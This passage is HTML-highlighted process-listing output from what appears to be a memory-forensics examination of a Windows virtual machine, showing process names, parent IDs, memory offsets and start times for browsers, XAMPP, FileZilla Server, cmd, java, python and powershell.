</span></span><span style="display:flex;"><span><span style="color:#bd93f9">7572</span>    <span style="color:#bd93f9">796</span>     MicrosoftEdge.  0xc40aa6e712c0  <span style="color:#bd93f9">35</span>      -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:34.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">784</span>     <span style="color:#bd93f9">796</span>     ApplicationFra  0xc40aa40dd080  <span style="color:#bd93f9">3</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:34.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">488</span>     <span style="color:#bd93f9">796</span>     Skype4Life.exe  0xc40aa5c6c080  <span style="color:#bd93f9">14</span>      -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:34.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">508</span>     <span style="color:#bd93f9">796</span>     SkypeHelper.ex  0xc40aa10e3080  <span style="color:#bd93f9">4</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:34.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2796</span>    <span style="color:#bd93f9">796</span>     YourPhone.exe   0xc40aa64b14c0  <span style="color:#bd93f9">16</span>      -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:34.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2660</span>    <span style="color:#bd93f9">796</span>     browser_broker  0xc40aa6ae7500  <span style="color:#bd93f9">4</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:34.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1616</span>    <span style="color:#bd93f9">796</span>     RuntimeBroker.  0xc40aa6abe500  <span style="color:#bd93f9">1</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:34.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2740</span>    <span style="color:#bd93f9">1616</span>    MicrosoftEdgeS  0xc40aa71f3080  <span style="color:#bd93f9">9</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:35.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">6480</span>    <span style="color:#bd93f9">796</span>     MicrosoftEdgeC  0xc40aa4981080  <span style="color:#bd93f9">15</span>      -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:35.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">5928</span>    <span style="color:#bd93f9">1468</span>    TabTip.exe      0xc40aa694c540  <span style="color:#bd93f9">5</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:35.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">5588</span>    <span style="color:#bd93f9">796</span>     RuntimeBroker.  0xc40aa4bc3080  <span style="color:#bd93f9">3</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:37.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">844</span>     <span style="color:#bd93f9">796</span>     backgroundTask  0xc40aa6f99080  <span style="color:#bd93f9">0</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:40.000000      2023-10-31 13:34:57.000000      Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">8036</span>    <span style="color:#bd93f9">796</span>     RuntimeBroker.  0xc40aa6dc1080  <span style="color:#bd93f9">1</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:44.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">6956</span>    <span style="color:#bd93f9">796</span>     smartscreen.ex  0xc40aa5a5b300  <span style="color:#bd93f9">6</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:45.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">3536</span>    <span style="color:#bd93f9">7944</span>    SecurityHealth  0xc40aa4ba23c0  <span style="color:#bd93f9">1</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:45.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">7516</span>    <span style="color:#bd93f9">796</span>     SystemSettings  0xc40aa6e5d400  <span style="color:#bd93f9">17</span>      -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:45.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">6028</span>    <span style="color:#bd93f9">7944</span>    vm3dservice.ex  0xc40aa6f7e500  <span style="color:#bd93f9">1</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:46.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">4596</span>    <span style="color:#bd93f9">7944</span>    vmtoolsd.exe    0xc40aa69b73c0  <span style="color:#bd93f9">6</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:46.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">5712</span>    <span style="color:#bd93f9">7944</span>    chrome.exe      0xc40aa6fca080  <span style="color:#bd93f9">0</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:50.000000      2023-10-31 13:33:04.000000      Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">8444</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa6647080  <span style="color:#bd93f9">11</span>      -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:32:59.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">8536</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa76a3080  <span style="color:#bd93f9">1</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:32:59.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">8744</span>    <span style="color:#bd93f9">620</span>     SgrmBroker.exe  0xc40aa7a1a080  <span style="color:#bd93f9">5</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:33:00.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">8772</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa7a15080  <span style="color:#bd93f9">6</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:33:00.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">8820</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa6fc13c0  <span style="color:#bd93f9">6</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:33:00.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">9036</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa7a21300  <span style="color:#bd93f9">1</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:33:00.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">8352</span>    <span style="color:#bd93f9">796</span>     RuntimeBroker.  0xc40aa7a1c2c0  <span style="color:#bd93f9">4</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:33:05.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1076</span>    <span style="color:#bd93f9">796</span>     dllhost.exe     0xc40aa6d36080  <span style="color:#bd93f9">5</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:33:06.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">8860</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa65c3080  <span style="color:#bd93f9">0</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:33:58.000000      2023-10-31 13:34:03.000000      Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">8416</span>    <span style="color:#bd93f9">3800</span>    LogonUI.exe     0xc40aa0ee8080  <span style="color:#bd93f9">5</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:35:09.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">7884</span>    <span style="color:#bd93f9">7812</span>    csrss.exe       0xc40aa7a1d080  <span style="color:#bd93f9">13</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:09.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">588</span>     <span style="color:#bd93f9">796</span>     Microsoft.Phot  0xc40aa0eaa080  <span style="color:#bd93f9">15</span>      -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:35:09.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1020</span>    <span style="color:#bd93f9">7812</span>    winlogon.exe    0xc40aa768b080  <span style="color:#bd93f9">5</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:09.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1792</span>    <span style="color:#bd93f9">1020</span>    fontdrvhost.ex  0xc40aa63ce080  <span style="color:#bd93f9">5</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:09.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">6680</span>    <span style="color:#bd93f9">1020</span>    dwm.exe 0xc40aa5ea5080  <span style="color:#bd93f9">14</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:09.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">9044</span>    <span style="color:#bd93f9">796</span>     RuntimeBroker.  0xc40aa7a1e080  <span style="color:#bd93f9">1</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:35:10.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">4060</span>    <span style="color:#bd93f9">796</span>     RuntimeBroker.  0xc40aa6107080  <span style="color:#bd93f9">2</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:35:11.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">6824</span>    <span style="color:#bd93f9">1404</span>    sihost.exe      0xc40aa4d76080  <span style="color:#bd93f9">10</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:12.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">6432</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa5eeb080  <span style="color:#bd93f9">8</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:12.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">6788</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa4f8d080  <span style="color:#bd93f9">4</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:12.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2104</span>    <span style="color:#bd93f9">1208</span>    taskhostw.exe   0xc40aa69ab400  <span style="color:#bd93f9">7</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:12.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">6172</span>    <span style="color:#bd93f9">1468</span>    ctfmon.exe      0xc40aa4fc5080  <span style="color:#bd93f9">8</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:12.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">5420</span>    <span style="color:#bd93f9">1468</span>    TabTip.exe      0xc40aa5a8c2c0  <span style="color:#bd93f9">9</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:12.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">8788</span>    <span style="color:#bd93f9">1020</span>    userinit.exe    0xc40aa73c2440  <span style="color:#bd93f9">0</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:12.000000      2023-10-31 13:35:36.000000      Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1424</span>    <span style="color:#bd93f9">8788</span>    explorer.exe    0xc40aa8c11440  <span style="color:#bd93f9">87</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:12.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">404</span>     <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa8c69400  <span style="color:#bd93f9">6</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:13.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">7100</span>    <span style="color:#bd93f9">796</span>     ShellExperienc  0xc40aa8cca0c0  <span style="color:#bd93f9">26</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:13.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">7448</span>    <span style="color:#bd93f9">796</span>     SearchUI.exe    0xc40aa76c0080  <span style="color:#bd93f9">46</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:13.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">3244</span>    <span style="color:#bd93f9">796</span>     RuntimeBroker.  0xc40aa8ca53c0  <span style="color:#bd93f9">7</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:14.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">6136</span>    <span style="color:#bd93f9">796</span>     YourPhone.exe   0xc40aa82e0080  <span style="color:#bd93f9">15</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:14.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2324</span>    <span style="color:#bd93f9">796</span>     SkypeHelper.ex  0xc40aa4ef1080  <span style="color:#bd93f9">4</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:14.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">8368</span>    <span style="color:#bd93f9">796</span>     Skype4Life.exe  0xc40aa69a9080  <span style="color:#bd93f9">15</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:14.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">7812</span>    <span style="color:#bd93f9">796</span>     RuntimeBroker.  0xc40aa8cc3080  <span style="color:#bd93f9">4</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:15.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">7472</span>    <span style="color:#bd93f9">796</span>     HxTsr.exe       0xc40aa8caa080  <span style="color:#bd93f9">13</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:20.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2412</span>    <span style="color:#bd93f9">796</span>     RuntimeBroker.  0xc40aa8cc7080  <span style="color:#bd93f9">2</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:20.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">112</span>     <span style="color:#bd93f9">796</span>     RuntimeBroker.  0xc40aa8cc0080  <span style="color:#bd93f9">1</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:20.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">6932</span>    <span style="color:#bd93f9">796</span>     RuntimeBroker.  0xc40aa8cbd080  <span style="color:#bd93f9">1</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:21.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">9064</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa90b4080  <span style="color:#bd93f9">6</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:21.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">4664</span>    <span style="color:#bd93f9">796</span>     smartscreen.ex  0xc40aa904d3c0  <span style="color:#bd93f9">9</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:24.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">5800</span>    <span style="color:#bd93f9">1424</span>    SecurityHealth  0xc40aa9050080  <span style="color:#bd93f9">1</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:24.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">8644</span>    <span style="color:#bd93f9">1424</span>    vm3dservice.ex  0xc40aa91f6400  <span style="color:#bd93f9">1</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:25.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1736</span>    <span style="color:#bd93f9">1424</span>    xampp-control.  0xc40aa92a7080  <span style="color:#bd93f9">1</span>       -       <span style="color:#bd93f9">4</span>       True    2023-10-31 13:35:28.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">8048</span>    <span style="color:#bd93f9">1424</span>    chrome.exe      0xc40aa63ae080  <span style="color:#bd93f9">40</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:31.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">8728</span>    <span style="color:#bd93f9">8048</span>    chrome.exe      0xc40aa71e8080  <span style="color:#bd93f9">9</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:31.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">7412</span>    <span style="color:#bd93f9">8048</span>    chrome.exe      0xc40aa9290080  <span style="color:#bd93f9">14</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:31.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">5072</span>    <span style="color:#bd93f9">8048</span>    chrome.exe      0xc40aa630e080  <span style="color:#bd93f9">16</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:31.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">5576</span>    <span style="color:#bd93f9">8048</span>    chrome.exe      0xc40aa92a8080  <span style="color:#bd93f9">10</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:31.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">8124</span>    <span style="color:#bd93f9">8048</span>    chrome.exe      0xc40aa6104080  <span style="color:#bd93f9">15</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:31.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">9352</span>    <span style="color:#bd93f9">796</span>     HxOutlook.exe   0xc40aa93b3080  <span style="color:#bd93f9">15</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:32.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">9412</span>    <span style="color:#bd93f9">796</span>     ApplicationFra  0xc40aa94ed400  <span style="color:#bd93f9">7</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:32.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">9420</span>    <span style="color:#bd93f9">796</span>     MicrosoftEdge.  0xc40aa93b2080  <span style="color:#bd93f9">22</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:32.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">9572</span>    <span style="color:#bd93f9">796</span>     browser_broker  0xc40aa9562400  <span style="color:#bd93f9">6</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:32.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">9580</span>    <span style="color:#bd93f9">796</span>     RuntimeBroker.  0xc40aa94253c0  <span style="color:#bd93f9">3</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:32.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">10204</span>   <span style="color:#bd93f9">796</span>     HxAccounts.exe  0xc40aa91dc4c0  <span style="color:#bd93f9">14</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:35.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">10212</span>   <span style="color:#bd93f9">9580</span>    MicrosoftEdgeS  0xc40aa9188480  <span style="color:#bd93f9">6</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:35.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">9408</span>    <span style="color:#bd93f9">796</span>     MicrosoftEdgeC  0xc40aa91df080  <span style="color:#bd93f9">29</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:35.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">10832</span>   <span style="color:#bd93f9">8048</span>    chrome.exe      0xc40aa989f080  <span style="color:#bd93f9">15</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:45.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">10840</span>   <span style="color:#bd93f9">8048</span>    chrome.exe      0xc40aa98c3080  <span style="color:#bd93f9">15</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:45.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">10600</span>   <span style="color:#bd93f9">8048</span>    chrome.exe      0xc40aa76d9080  <span style="color:#bd93f9">15</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:49.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">10988</span>   <span style="color:#bd93f9">796</span>     MicrosoftEdgeC  0xc40aa98f50c0  <span style="color:#bd93f9">13</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:50.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">7208</span>    <span style="color:#bd93f9">796</span>     MicrosoftEdgeC  0xc40aa690d080  <span style="color:#bd93f9">0</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:36:08.000000      2023-10-31 13:36:18.000000      Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">11096</span>   <span style="color:#bd93f9">796</span>     RuntimeBroker.  0xc40aa95fa280  <span style="color:#bd93f9">7</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:36:10.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">10336</span>   <span style="color:#bd93f9">796</span>     MicrosoftEdgeC  0xc40aa9b96080  <span style="color:#bd93f9">13</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:36:19.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">376</span>     <span style="color:#bd93f9">796</span>     WindowsInterna  0xc40aa541e080  <span style="color:#bd93f9">33</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:36:48.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">4912</span>    <span style="color:#bd93f9">1424</span>    python.exe      0xc40aa770e080  <span style="color:#bd93f9">1</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:37:10.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">3028</span>    <span style="color:#bd93f9">4912</span>    conhost.exe     0xc40aa64af080  <span style="color:#bd93f9">3</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:37:10.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2896</span>    <span style="color:#bd93f9">4912</span>    python.exe      0xc40aa9972080  <span style="color:#bd93f9">4</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:37:10.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">7368</span>    <span style="color:#bd93f9">8048</span>    chrome.exe      0xc40aa98d0400  <span style="color:#bd93f9">15</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:37:17.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">11204</span>   <span style="color:#bd93f9">1736</span>    httpd.exe       0xc40aa99c6080  <span style="color:#bd93f9">1</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:37:40.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">9128</span>    <span style="color:#bd93f9">11204</span>   conhost.exe     0xc40aa4ee0080  <span style="color:#bd93f9">3</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:37:40.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">5212</span>    <span style="color:#bd93f9">1736</span>    mysqld.exe      0xc40aa9898500  <span style="color:#bd93f9">30</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:37:41.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">9652</span>    <span style="color:#bd93f9">11204</span>   httpd.exe       0xc40aa9cfe500  <span style="color:#bd93f9">155</span>     -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:37:41.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">11048</span>   <span style="color:#bd93f9">1736</span>    FileZillaServe  0xc40aa989c500  <span style="color:#bd93f9">5</span>       -       <span style="color:#bd93f9">4</span>       True    2023-10-31 13:37:41.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">4276</span>    <span style="color:#bd93f9">1736</span>    cmd.exe 0xc40aaa3cf080  <span style="color:#bd93f9">1</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:37:43.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">8568</span>    <span style="color:#bd93f9">4276</span>    conhost.exe     0xc40aaa3ce080  <span style="color:#bd93f9">3</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:37:43.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2696</span>    <span style="color:#bd93f9">4276</span>    java.exe        0xc40aaa3d7080  <span style="color:#bd93f9">35</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:37:47.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1272</span>    <span style="color:#bd93f9">796</span>     dllhost.exe     0xc40aaa3d3080  <span style="color:#bd93f9">9</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:38:25.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">10048</span>   <span style="color:#bd93f9">1424</span>    cmd.exe 0xc40aa956d540  <span style="color:#bd93f9">1</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:38:25.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">10040</span>   <span style="color:#bd93f9">10048</span>   conhost.exe     0xc40aa95f6080  <span style="color:#bd93f9">3</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:38:25.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">9872</span>    <span style="color:#bd93f9">1736</span>    FileZilla Serv  0xc40aa4fa2080  <span style="color:#bd93f9">1</span>       -       <span style="color:#bd93f9">4</span>       True    2023-10-31 13:39:07.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">9880</span>    <span style="color:#bd93f9">1736</span>    FileZilla Serv  0xc40aa739e080  <span style="color:#bd93f9">2</span>       -       <span style="color:#bd93f9">4</span>       True    2023-10-31 13:41:02.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">8188</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aaa4d8100  <span style="color:#bd93f9">4</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:41:23.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">5708</span>    <span style="color:#bd93f9">8048</span>    chrome.exe      0xc40aa5ea8080  <span style="color:#bd93f9">9</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:42:08.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">6772</span>    <span style="color:#bd93f9">1424</span>    powershell.exe  0xc40aa9de7080  <span style="color:#bd93f9">11</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:42:21.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">4532</span>    <span style="color:#bd93f9">6772</span>    conhost.exe     0xc40aaa8de4c0  <span style="color:#bd93f9">3</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:42:22.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">4964</span>    <span style="color:#bd93f9">8048</span>    chrome.exe      0xc40aa6a08080  <span style="color:#bd93f9">15</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:44:11.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">5116</span>    <span style="color:#bd93f9">1424</span>    mspaint.exe     0xc40aaa3f1080  <span style="color:#bd93f9">7</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:45:43.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">10100</span>   <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa539a080  <span style="color:#bd93f9">4</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:45:43.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">11172</span>   <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aaa5d1080  <span style="color:#bd93f9">1</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:45:43.000000      N/A     Disabled
